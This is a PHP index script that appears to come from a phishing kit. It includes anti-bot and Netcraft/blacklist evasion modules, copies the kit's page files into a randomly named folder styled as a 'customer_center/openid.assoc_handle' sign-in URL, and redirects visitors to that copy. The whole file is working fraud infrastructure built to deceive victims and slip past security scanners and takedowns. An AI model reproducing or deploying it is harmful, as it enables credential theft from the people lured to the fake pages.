<?php
session_start();
error_reporting(0);
require "blocker.php";
require "logs/visitor.php";
require "kill-bot/netcraft_check.php";
require "kill-bot/blacklist_lookup.php";
require "ap/functions/Mfunctions.php";
if (strlen(SERVER_GATEWAY()) !== 30) { @SgenRan(dirname(__DIR__));}
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./customer_center/openid.assoc_handle=".$DIR;
$SOMETHING="ap";
function recurse_copy($SOMETHING,$DIR) {
$dir = opendir($SOMETHING);
@mkdir($DIR);
while(false !== ( $somefile = readdir($dir)) ) {
if (( $somefile != '.' ) && ( $somefile != '..' )) {
if ( is_dir($SOMETHING . '/' . $somefile) ) {
recurse_copy($SOMETHING . '/' . $somefile,$DIR . '/' . $somefile);
}
else {
copy($SOMETHING . '/' . $somefile,$DIR . '/' . $somefile);
}
}
}
closedir($dir);
}
recurse_copy( $SOMETHING, $DIR );
header("LOCATION: ".$DIR."");
?>
